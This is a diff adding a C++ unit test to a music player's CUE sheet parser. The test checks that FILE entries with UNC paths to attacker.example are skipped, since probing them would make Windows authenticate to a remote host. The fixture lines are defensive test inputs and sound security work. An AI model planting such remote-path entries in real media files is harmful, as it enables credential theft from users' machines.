@@ -253,4 +253,29 @@ TEST_F(CueParserTest, TrackWithoutFileIsSkipped) {
 
 }
 
+// A FILE with a UNC path makes Windows authenticate to the host when the collection watcher probes it, its tracks are skipped.
+TEST_F(CueParserTest, MediaFilesOnAnotherHostAreIgnored) {
+
+  QByteArray cue;
+  cue += "TITLE \"Album\"\r\n";
+  cue += "FILE \"\\\\attacker.example\\share\\a.wav\" WAVE\r\n";
+  cue += "  TRACK 01 AUDIO\r\n";
+  cue += "    INDEX 01 00:00:00\r\n";
+  cue += "FILE \"//attacker.example/share/b.wav\" WAVE\r\n";
+  cue += "  TRACK 02 AUDIO\r\n";
+  cue += "    INDEX 01 00:00:00\r\n";
+  cue += "FILE \"CD1.flac\" WAVE\r\n";
+  cue += "  TRACK 03 AUDIO\r\n";
+  cue += "    INDEX 01 00:00:00\r\n";
+
+  QBuffer buffer(&cue);
+  ASSERT_TRUE(buffer.open(QIODevice::ReadOnly));
+
+  CueParser parser = MakeParser();
+  const QStringList media_files = parser.MediaFiles(&buffer, QDir(u"/albums/album"_s));
+
+  EXPECT_EQ(QStringList() << u"/albums/album/CD1.flac"_s, media_files);
+
+}
+
 }  // namespace
